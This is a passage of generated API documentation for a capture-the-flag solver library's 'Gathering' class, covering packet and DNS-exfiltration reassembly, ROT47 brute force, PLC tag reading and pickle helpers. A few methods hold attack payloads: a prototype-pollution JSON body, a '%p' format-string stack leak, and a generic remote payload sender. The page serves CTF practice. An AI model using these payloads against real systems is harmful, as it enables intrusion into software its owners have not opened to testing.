<pre><code class="python">def oracle_encrypt(self, pt_hex):
    self.recv_send(text=&#34;1&#34;, text_until=&#34;&gt; &#34;)
    self.recv_send(
        text=pt_hex,
        text_until=&#34;Provide message to encrypt &gt; &#34;,
    )
    encrypted_pt = self.recv_lines(1, save=True)[0]
    return bytes.fromhex(encrypted_pt.strip().decode())</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.parse_csr"><code class="name flex">
<span>def <span class="ident">parse_csr</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def parse_csr(self):
    with open(self.challenge_file, &#34;rb&#34;) as f:
        csr_data = f.read()

    csr = crypto.load_certificate_request(crypto.FILETYPE_PEM, csr_data)
    # Print the parsed CSR
    for i in range(csr.get_subject().get_components().__len__()):
        print(csr.get_subject().get_components()[i])</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.payload_maker"><code class="name flex">
<span>def <span class="ident">payload_maker</span></span>(<span>self, password, number)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def payload_maker(self, password, number):
    payload = {&#34;password&#34;: password, &#34;number&#34;: number}
    return json.dumps(payload)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.pickle_load_data"><code class="name flex">
<span>def <span class="ident">pickle_load_data</span></span>(<span>self, filename:str, folder:str='data') ><built-infunctionany></span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def pickle_load_data(self, filename: str, folder: str = &#34;data&#34;) -&gt; any:
    &#34;&#34;&#34;
    Description:
        Load data from a pickle file

    Args:
        filename (str): Filename to load the data from
        folder (str, optional): Folder name to find the file to load the data from. Defaults to &#34;data&#34;.

    Returns:
        any: Data loaded from pickle
    &#34;&#34;&#34;
    with open(self.folfil(folder, filename), &#34;rb&#34;) as f:
        return pickle.load(f)</code></pre>
</details>
<div class="desc"><h2 id="description">Description</h2>
<p>Load data from a pickle file</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>filename</code></strong> :&ensp;<code>str</code></dt>
<dd>Filename to load the data from</dd>
<dt><strong><code>folder</code></strong> :&ensp;<code>str</code>, optional</dt>
<dd>Folder name to find the file to load the data from. Defaults to "data".</dd>
</dl>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>any</code></dt>
<dd>Data loaded from pickle</dd>
</dl></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.pickle_save_data"><code class="name flex">
<span>def <span class="ident">pickle_save_data</span></span>(<span>self, data:<built-infunctionany>, filename:str, folder:str='data') >None</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def pickle_save_data(self, data: any, filename: str, folder: str = &#34;data&#34;) -&gt; None:
    &#34;&#34;&#34;
    Description:
        Save data to a pickle file

    Args:
        data (any): data to write to the pickle file. Can be anything
        filename (str): Filename to save
        folder (str, optional): Folder name inside the ctf folder. Defaults to &#34;data&#34;.

    Returns:
        None
    &#34;&#34;&#34;
    with open(self.folfil(folder, filename), &#34;wb&#34;) as f:
        pickle.dump(data, f)</code></pre>
</details>
<div class="desc"><h2 id="description">Description</h2>
<p>Save data to a pickle file</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>data</code></strong> :&ensp;<code>any</code></dt>
<dd>data to write to the pickle file. Can be anything</dd>
<dt><strong><code>filename</code></strong> :&ensp;<code>str</code></dt>
<dd>Filename to save</dd>
<dt><strong><code>folder</code></strong> :&ensp;<code>str</code>, optional</dt>
<dd>Folder name inside the ctf folder. Defaults to "data".</dd>
</dl>
<h2 id="returns">Returns</h2>
<p>None</p></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.play_game"><code class="name flex">
<span>def <span class="ident">play_game</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def play_game(self):
    self.choice_text = &#34;The number on the table is &#34;
    self.initiate_connection()
    self.get_welcome_message()

    # Some kind of loop probably
    self.play_round()

    round_result = self.recv_lines(1, save=True)[0]
    print(round_result)
    if &#34;10/10&#34; in round_result:
        self.recv_lines(3, display=True)

    self.conn.close()</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.play_round"><code class="name flex">
<span>def <span class="ident">play_round</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def play_round(self):
    time.sleep(1)
    choice = [1, 2][0]
    # Get the visible number
    visible_number = self.recv_lines(1, save=True)[0]
    # print(visible_number)
    print(self.extract_printable_with_spaces(visible_number.decode(&#34;utf-8&#34;)))
    # visible_number = int(visible_number.split()[-1])
    # User choice
    # text_until = self.simulate_ansi_typing(&#34;&gt; &#34;)
    text_until = &#34;&gt; &#34;
    # out = self.recv_send(
    #     text_until=text_until,
    #     lines=5,
    #     text=choice,
    #     display=True,
    #     save=True,
    # )
    out = self.recv_lines(6, save=True)
    for line in out:
        print(self.extract_printable_with_spaces(line.decode(&#34;utf-8&#34;)))

    out = self.recv_until(text=text_until, ansi_escape=False)
    # print(out)
    self.send(choice)
    # for line in out:
    #     print(self.extract_printable_with_spaces(line.decode(&#34;utf-8&#34;)))
    out = self.recv_lines(2, save=True)
    for line in out:
        print(self.extract_printable_with_spaces(line.decode(&#34;utf-8&#34;)))</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.plc_initiate_connection"><code class="name flex">
<span>def <span class="ident">plc_initiate_connection</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def plc_initiate_connection(self):
    # try:
    with LogixDriver(&#34;challenge.hackthat.site/55373&#34;) as plc:
        print(&#34;Connected to PLC&#34;)
        tag_value = plc.read(&#34;Flag&#34;)
        print(f&#34;Flag value: {tag_value}&#34;)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.plc_work"><code class="name flex">
<span>def <span class="ident">plc_work</span></span>(<span>self, solution, plc)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def plc_work(self, solution, plc):

    print(plc.get_tags())

    return

    tag = LogixTag(name=&#34;Flag&#34;, tag_type=LogixTagType.STRING)
    plc.add_tag(tag)

    # Read the flag from the PLC
    flag = plc.read(&#34;Flag&#34;)
    if flag:
        print(f&#34;Flag: {flag.value}&#34;)
    else:
        print(&#34;Failed to read the flag from PLC&#34;)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.pollute"><code class="name flex">
<span>def <span class="ident">pollute</span></span>(<span>self, base_url)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def pollute(self, base_url):
    payload = {
        &#34;user.username&#34;: &#34;nikolas&#34;,
        &#34;user.password&#34;: &#34;nikolas&#34;,
        &#34;user.__proto__.payloads&#34;: [&#34;none&#34;],
        &#34;user.__proto__.authKeyFile&#34;: True,
    }
    r = requests.post(f&#34;{base_url}/api/register&#34;, json=payload)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.position_cipher"><code class="name flex">
<span>def <span class="ident">position_cipher</span></span>(<span>self, text:str, keys:list)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def position_cipher(self, text: str, keys: list):
    &#34;&#34;&#34;
    Description:
        This function takes a text and a list of keys, and returns a new string
        where each character in the text is replaced by the character at the
        corresponding index in the keys list. If the index exceeds the length of
        the text, it wraps around using modulo operation.
    Args:
        text (str): The input text to be transformed.
        keys (list): A list of integers representing the positions in the text.
    Returns:
        str: A new string formed by replacing characters in the text based on the keys.
    &#34;&#34;&#34;

    return &#34;&#34;.join(text[i % len(text)] for i in keys)</code></pre>
</details>
<div class="desc"><h2 id="description">Description</h2>
<p>This function takes a text and a list of keys, and returns a new string
where each character in the text is replaced by the character at the
corresponding index in the keys list. If the index exceeds the length of
the text, it wraps around using modulo operation.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>text</code></strong> :&ensp;<code>str</code></dt>
<dd>The input text to be transformed.</dd>
<dt><strong><code>keys</code></strong> :&ensp;<code>list</code></dt>
<dd>A list of integers representing the positions in the text.</dd>
</dl>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>str</code></dt>
<dd>A new string formed by replacing characters in the text based on the keys.</dd>
</dl></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.preparing_dictionary"><code class="name flex">
<span>def <span class="ident">preparing_dictionary</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def preparing_dictionary(self):
    &#34;&#34;&#34;
    This method is not used in the current solution.
    It can be implemented if needed for future enhancements.
    &#34;&#34;&#34;
    additional = {
        &#34;e&#34;: 3,
        &#34;a&#34;: 4,
        &#34;i&#34;: 1,
        &#34;o&#34;: 0,
        &#34;s&#34;: 5,
        &#34;t&#34;: 7,
        &#34;g&#34;: 9,
    }
    self.dictionary = &#34;_-{}&#34;
    for i in range(len(ascii_uppercase)):
        if ascii_lowercase[i] in additional:
            self.dictionary += str(additional[ascii_lowercase[i]])
        self.dictionary += ascii_uppercase[i] + ascii_lowercase[i]
    self.dictionary += digits + punctuation</code></pre>
</details>
<div class="desc"><p>This method is not used in the current solution.
It can be implemented if needed for future enhancements.</p></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.print_dictionary"><code class="name flex">
<span>def <span class="ident">print_dictionary</span></span>(<span>self, d)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def print_dictionary(self, d):
    sorted_items = sorted(d.items(), key=lambda x: x[0])
    for key, value in sorted_items:
        print(f&#34;{key}: {value}&#34;)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.print_to_File"><code class="name flex">
<span>def <span class="ident">print_to_File</span></span>(<span>self, data, verbose=False, file_name='output.txt')</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def print_to_File(self, data, verbose=False, file_name=&#34;output.txt&#34;):

    if verbose:
        print(data)
    with open(self.folfil(&#34;data&#34;, file_name), &#34;a&#34;) as f:
        f.write(data + &#34;\n&#34;)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.pyshark_extrac_tcp_stream_numbers"><code class="name flex">
<span>def <span class="ident">pyshark_extrac_tcp_stream_numbers</span></span>(<span>self, pcap_file)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def pyshark_extrac_tcp_stream_numbers(self, pcap_file):
    &#34;&#34;&#34;
    Description:
        Extracts the tcp stream numbers from the pcap

    Args:
        pcap_file (str): Path to the pcap file.

    Returns:
        dict: Dictionary of session indexes
    &#34;&#34;&#34;
    # To save the stream indexes
    sess_index = {}
    cap = self.smart_extract_packets(
        pcap_file,
        pcap_function=&#34;pyshark&#34;,
        save=True,
        filename_save=&#34;packets_pyshark.pickle&#34;,
    )

    for i, pkt in enumerate(cap):
        if hasattr(pkt.tcp, &#34;stream&#34;):
            sess_index[i + 1] = pkt.tcp.stream
    return sess_index</code></pre>
</details>
<div class="desc"><h2 id="description">Description</h2>
<p>Extracts the tcp stream numbers from the pcap</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>pcap_file</code></strong> :&ensp;<code>str</code></dt>
<dd>Path to the pcap file.</dd>
</dl>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>dict</code></dt>
<dd>Dictionary of session indexes</dd>
</dl></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.pyshark_extract_tcp_streams"><code class="name flex">
<span>def <span class="ident">pyshark_extract_tcp_streams</span></span>(<span>self, pcap_file, stream_num)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def pyshark_extract_tcp_streams(self, pcap_file, stream_num):
    # To save the stream indexes
    packet_dict = {}
    cap = self.smart_extract_packets(
        pcap_file,
        pcap_function=&#34;pyshark&#34;,
        save=True,
        filename_save=&#34;packets_pyshark.pickle&#34;,
    )

    for i, pkt in enumerate(cap):
        if hasattr(pkt.tcp, &#34;stream&#34;) and int(pkt.tcp.stream) == stream_num:
            packet_dict[i + 1] = pkt
    return packet_dict</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.random_flouri_generator"><code class="name flex">
<span>def <span class="ident">random_flouri_generator</span></span>(<span>self, number=None)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def random_flouri_generator(self, number=None):
    m = 10**30

    if number:
        return (
            number**11
            + 17 * number**7
            - 42 * number**5
            + 1337 * number * 3
            + 31337 * number
        )

    return (
        random.randint(1, m) ** 11
        + 17 * random.randint(1, m) ** 7
        - 42 * random.randint(1, m) ** 5
        + 1337 * random.randint(1, m) * 3
        + 31337 * random.randint(1, m)
    )</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.read_address_positions"><code class="name flex">
<span>def <span class="ident">read_address_positions</span></span>(<span>self, positions)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def read_address_positions(self, positions):
    &#34;&#34;&#34;
    Reads the address of the stack

    Args:
        positions (int): Number of positions to read

    Returns:
        list: List of addresses
    &#34;&#34;&#34;
    # How to read a specific address
    payload = &#34;%p &#34; * positions
    output = self.simple_payload_send(payload)
    address_all = output.decode(&#34;utf-8&#34;).strip(&#34;\n&#34;).split(&#34; &#34;)

    return address_all</code></pre>
</details>
<div class="desc"><p>Reads the address of the stack</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>positions</code></strong> :&ensp;<code>int</code></dt>
<dd>Number of positions to read</dd>
</dl>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>list</code></dt>
<dd>List of addresses</dd>
</dl></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.read_json"><code class="name flex">
<span>def <span class="ident">read_json</span></span>(<span>self, filename)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def read_json(self, filename):
    with open(self.folfil(&#34;data&#34;, filename), &#34;r&#34;) as f:
        return json.load(f)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.reassemblying_dns"><code class="name flex">
<span>def <span class="ident">reassemblying_dns</span></span>(<span>self, packets=None)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def reassemblying_dns(self, packets=None):
    if packets is None:
        packets = self.packets

    hex_parts = []

    dns_packets = []
    for packet in packets:
        # if packet.haslayer(&#34;DNS&#34;) and packet[&#34;DNS&#34;].qr == 0:  # DNS query
        #     query_name = packet[&#34;DNS&#34;].qd.qname.decode(&#34;utf-8&#34;).strip(&#34;.&#34;)
        #     dns_packets.append(query_name)

        if packet.haslayer(DNSQR):
            qname = packet[DNSQR].qname.decode()
            qname = packet[DNSQR].qname.decode(errors=&#34;ignore&#34;).strip(&#34;.&#34;)

            # Extract the first label (before the first dot)
            # part = qname.split(&#34;.&#34;)[0]
            labels = qname.split(&#34;.&#34;)
            for part in labels:
                # Must be even-length hex and not too short
                if re.fullmatch(r&#34;[a-fA-F0-9]{2,}&#34;, part) and len(part) % 2 == 0:
                    if part not in hex_parts:
                        hex_parts.append(part)

    hex_data = &#34;&#34;.join(hex_parts)
    try:
        exfiltrated_data = bytes.fromhex(hex_data).decode(&#34;utf-8&#34;)

        with open(self.folfil(&#34;data&#34;, &#34;exfiltrated.txt&#34;), &#34;w&#34;) as f:
            f.write(exfiltrated_data)

    except ValueError:
        exfiltrated_data = &#34;Invalid hex data&#34;

    return exfiltrated_data</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.reconstructing_url"><code class="name flex">
<span>def <span class="ident">reconstructing_url</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def reconstructing_url(self):
    self.complete_url = f&#34;http://{self.url}:{self.port}&#34;</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.recover_skew1_cell_hex"><code class="name flex">
<span>def <span class="ident">recover_skew1_cell_hex</span></span>(<span>self, cell_size, cell_data)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def recover_skew1_cell_hex(self, cell_size, cell_data):
    &#34;&#34;&#34;
    Recover the Skew1 part of the Windows BootKey as a continuous hex string.

    Args:
        cell_size (int): The size of the registry cell (including size bytes and data).
        cell_data (bytes): The raw bytes of the cell data including the Skew1 Class Name/Attribute.

    Returns:
        str: The continuous hex string in the format ECSC{...}
    &#34;&#34;&#34;
    # Convert cell size to 4 bytes, little-endian
    size_bytes = cell_size.to_bytes(4, byteorder=&#34;little&#34;)
    # Concatenate size and data
    full_cell = size_bytes + cell_data
    # Convert to uppercase hex string
    hex_string = full_cell.hex().upper()
    # Format as flag
    return hex_string</code></pre>
</details>
<div class="desc"><p>Recover the Skew1 part of the Windows BootKey as a continuous hex string.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>cell_size</code></strong> :&ensp;<code>int</code></dt>
<dd>The size of the registry cell (including size bytes and data).</dd>
<dt><strong><code>cell_data</code></strong> :&ensp;<code>bytes</code></dt>
<dd>The raw bytes of the cell data including the Skew1 Class Name/Attribute.</dd>
</dl>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>str</code></dt>
<dd>The continuous hex string in the format ECSC{&hellip;}</dd>
</dl></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.regexp"><code class="name flex">
<span>def <span class="ident">regexp</span></span>(<span>self, file_content)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def regexp(self, file_content):
    pattern = b&#34;sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa&#34;
    index = file_content.find(pattern)
    index = index + len(pattern)
    return index</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.remote_exploitation"><code class="name flex">
<span>def <span class="ident">remote_exploitation</span></span>(<span>self, payload)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def remote_exploitation(self, payload):
    &#34;&#34;&#34;
    Performs remote exploitation using the given payload.

    Args:
        payload (bytes): The payload to use for remote exploitation.
    &#34;&#34;&#34;
    remote = CTFSolver(conn=&#34;remote&#34;, file=self.file, url=self.url, port=self.port)
    remote.initiate_connection()

    # Header
    remote.recv_lines(number=19, display=False)
    # Two sentence message
    remote.recv_lines(number=2, display=True)

    # Sending payload
    remote.send(payload, encode=False)

    remote.recv_lines(number=3, display=True)</code></pre>
</details>
<div class="desc"><p>Performs remote exploitation using the given payload.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>payload</code></strong> :&ensp;<code>bytes</code></dt>
<dd>The payload to use for remote exploitation.</dd>
</dl></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.rot"><code class="name flex">
<span>def <span class="ident">rot</span></span>(<span>self, text, shift)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def rot(self, text, shift):
    &#34;&#34;&#34;
    Applies the ROT47 cipher to the given text with the specified shift.

    Args:
        text (str): The input text.
        shift (int): The ROT47 shift amount.

    Returns:
        str: The transformed text.
    &#34;&#34;&#34;
    return &#34;&#34;.join([self.rot_char(c, shift) for c in text])</code></pre>
</details>
<div class="desc"><p>Applies the ROT47 cipher to the given text with the specified shift.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>text</code></strong> :&ensp;<code>str</code></dt>
<dd>The input text.</dd>
<dt><strong><code>shift</code></strong> :&ensp;<code>int</code></dt>
<dd>The ROT47 shift amount.</dd>
</dl>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>str</code></dt>
<dd>The transformed text.</dd>
</dl></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.rot_bruteforce"><code class="name flex">
<span>def <span class="ident">rot_bruteforce</span></span>(<span>self, crypted_text, known_text, max_shift=94)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def rot_bruteforce(self, crypted_text, known_text, max_shift=94):
    &#34;&#34;&#34;
    Brute forces ROT47 shifts to find the one that contains the known text.

    Args:
        crypted_text (str): The encrypted text.
        known_text (str): The known plaintext to look for.
        max_shift (int): The maximum shift to attempt (ROT47 has 94 shifts).

    Returns:
        int: The shift that contains the known text, or -1 if not found.
    &#34;&#34;&#34;
    for shift in range(1, max_shift):
        decrypted_text = self.rot(crypted_text, shift)
        if known_text.lower() in decrypted_text.lower():
            return shift
    return -1</code></pre>
</details>
<div class="desc"><p>Brute forces ROT47 shifts to find the one that contains the known text.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>crypted_text</code></strong> :&ensp;<code>str</code></dt>
<dd>The encrypted text.</dd>
<dt><strong><code>known_text</code></strong> :&ensp;<code>str</code></dt>
<dd>The known plaintext to look for.</dd>
<dt><strong><code>max_shift</code></strong> :&ensp;<code>int</code></dt>
<dd>The maximum shift to attempt (ROT47 has 94 shifts).</dd>
</dl>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>int</code></dt>
<dd>The shift that contains the known text, or -1 if not found.</dd>
</dl></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.rot_char"><code class="name flex">
<span>def <span class="ident">rot_char</span></span>(<span>self, c, shift)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def rot_char(self, c, shift):
    &#34;&#34;&#34;
    Rotates a single character using the ROT47 cipher.

    Args:
        c (str): The input character.
        shift (int): The ROT47 shift amount.

    Returns:
        str: The rotated character.
    &#34;&#34;&#34;
    ascii_code = ord(c)
    if 33 &lt;= ascii_code &lt;= 126:  # ROT47 only affects printable ASCII
        return chr((ascii_code - 33 + shift) % 94 + 33)
    return c</code></pre>
</details>
<div class="desc"><p>Rotates a single character using the ROT47 cipher.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>c</code></strong> :&ensp;<code>str</code></dt>
<dd>The input character.</dd>
<dt><strong><code>shift</code></strong> :&ensp;<code>int</code></dt>
<dd>The ROT47 shift amount.</dd>
</dl>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>str</code></dt>
<dd>The rotated character.</dd>
</dl></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.run"><code class="name flex">
<span>def <span class="ident">run</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def run(self):
    selections = [
        &#34;3_0&#34;,
        &#34;1_2&#34;,
        &#34;3_2&#34;,
        &#34;1_1&#34;,
        &#34;5_0&#34;,
        &#34;0_0&#34;,
        &#34;2_0&#34;,
        &#34;1_0&#34;,
        &#34;3_1&#34;,
        &#34;5_2&#34;,
        &#34;5_1&#34;,
        &#34;6_0&#34;,
        &#34;6_1&#34;,
        &#34;3_3&#34;,
        &#34;2_1&#34;,
        &#34;2_2&#34;,
        &#34;0_1&#34;,
    ]

    prs = Presentation(self.challenge_file)
    correct = True

    for selection in selections:
        slide_index = int(selection[0])
        shape_index = 1 if selection[0] != &#34;0&#34; else 0
        text_index = int(selection[2])

        slide = prs.slides[slide_index]
        shape = slide.shapes[shape_index]
        text = shape.text

        if slide_index == 0:
            if text_index == 0 and text[0] != chr(123):
                correct = False
            elif text_index == 1 and text[23] != chr(125):
                correct = False
        elif slide_index == 1:
            if text_index == 0 and text[41] != chr(80):
                correct = False
            elif text_index == 1 and text[138] != chr(67):
                correct = False
            elif text_index == 2 and text[184] != chr(72):
                correct = False
        elif slide_index == 2:
            if text_index == 0 and text[0] != chr(80):
                correct = False
            elif text_index == 1 and text[83] != chr(101):
                correct = False
            elif text_index == 2 and text[179] != chr(82):
                correct = False
        elif slide_index == 3:
            if text_index == 0 and text[25] != chr(78):
                correct = False
            elif text_index == 1 and text[26] != chr(84):
                correct = False
            elif text_index == 2 and text[28] != chr(52):
                correct = False
            elif text_index == 3 and text[84] != chr(84):
                correct = False
        elif slide_index == 5:
            if text_index == 0 and text[105] != chr(75):
                correct = False
            elif text_index == 1 and text[106] != chr(109):
                correct = False
            elif text_index == 2 and text[219] != chr(88):
                correct = False
        elif slide_index == 6:
            if text_index == 0 and text[52] != chr(52):
                correct = False
            elif text_index == 1 and text[95] != chr(53):
                correct = False

    if correct:
        print(&#34;Thanx for helping me out, now go input the flag&#34;)
    else:
        print(&#34;I don&#39;t think i had that in mind&#34;)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.saving_requests"><code class="name flex">
<span>def <span class="ident">saving_requests</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def saving_requests(self):
    &#34;&#34;&#34;
    Save the requests made during the challenge to a file.
    This can help in debugging or understanding the flow of the challenge.
    &#34;&#34;&#34;

    setted_requests = set()
    for req in self.requests:
        if isinstance(req, list) and len(req) &gt; 1:
            setted_requests.add(tuple(req))
        elif isinstance(req, str):
            setted_requests.add((req,))

    with open(self.folfil(&#34;data&#34;, &#34;requests.json&#34;), &#34;r&#34;) as f:
        requests = json.load(f)
    with open(self.folfil(&#34;data&#34;, &#34;requests.json&#34;), &#34;w&#34;) as f:
        if not isinstance(requests, list):
            requests = []
        requests.extend(setted_requests)
        json.dump(requests, f, indent=4)
    print(f&#34;Saved {len(self.requests)} requests to data/requests.json&#34;)</code></pre>
</details>
<div class="desc"><p>Save the requests made during the challenge to a file.
This can help in debugging or understanding the flow of the challenge.</p></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.saving_stream_4_encrypted_bytes"><code class="name flex">
<span>def <span class="ident">saving_stream_4_encrypted_bytes</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def saving_stream_4_encrypted_bytes(self):
    &#34;&#34;&#34;
    Description:
        Challenge specific function
    &#34;&#34;&#34;

    stream_4 = self.custom_stream_extract(stream_num=4)

    start = 94
    end = 996

    # print(list(stream_4.keys())[0])
    # # print(stream_4[list(stream_4.keys())[0]].show())

    encrypted_load_file_path = self.folfil(&#34;data&#34;, &#34;encrypted_load.txt&#34;)

    for i, packet in stream_4.items():
        if i &lt; start or i &gt; end:
            continue

        if hasattr(packet, &#34;load&#34;) is False:
            continue

        try:
            with open(encrypted_load_file_path, &#34;ab&#34;) as f:
                f.write(packet.load)
            # decrypted_data = self.dec_file_mes(packet.load, self.encryption_key)
        except Exception as e:
            print(f&#34;packet {i} : {e}&#34;)

    decrypted_data = self.dec_file_mes(packet.load, self.encryption_key)
    print(f&#34;decrypted :&#34;)
    print(decrypted_data)</code></pre>
</details>
<div class="desc"><h2 id="description">Description</h2>
<p>Challenge specific function</p></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.saving_to_json"><code class="name flex">
<span>def <span class="ident">saving_to_json</span></span>(<span>self, crypted_dict)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def saving_to_json(self, crypted_dict):

    self.folfil(&#34;data&#34;, &#34;table.json&#34;)

    with open(self.folfil(&#34;data&#34;, &#34;table.json&#34;), &#34;w&#34;) as f:
        json.dump(crypted_dict, f, indent=4)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.saving_xml"><code class="name flex">
<span>def <span class="ident">saving_xml</span></span>(<span>self, log_file, file, display=False)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def saving_xml(self, log_file, file, display=False):
    xml_file = self.Path(self.folder_xml, f&#34;{file.name}.xml&#34;)
    if display:
        print(&#34;-&#34; * 50)
        print(f&#34;File: {file}&#34;)
        print(&#34;-&#34; * 50)

    with open(xml_file, &#34;w&#34;) as f:
        for record in log_file.records():
            record_xml = record.xml()
            if display:
                print(record_xml)
            f.write(record_xml)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.searching_packets"><code class="name flex">
<span>def <span class="ident">searching_packets</span></span>(<span>self, packets, text)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def searching_packets(self, packets, text):
    for i, packet in enumerate(packets):
        if packet.haslayer(&#34;Raw&#34;):
            if text.encode() in packet[&#34;Raw&#34;].load:
                print(f&#34;Found {text} in packet {i}&#34;)
                print(packet.show())
                print(packet.summary())
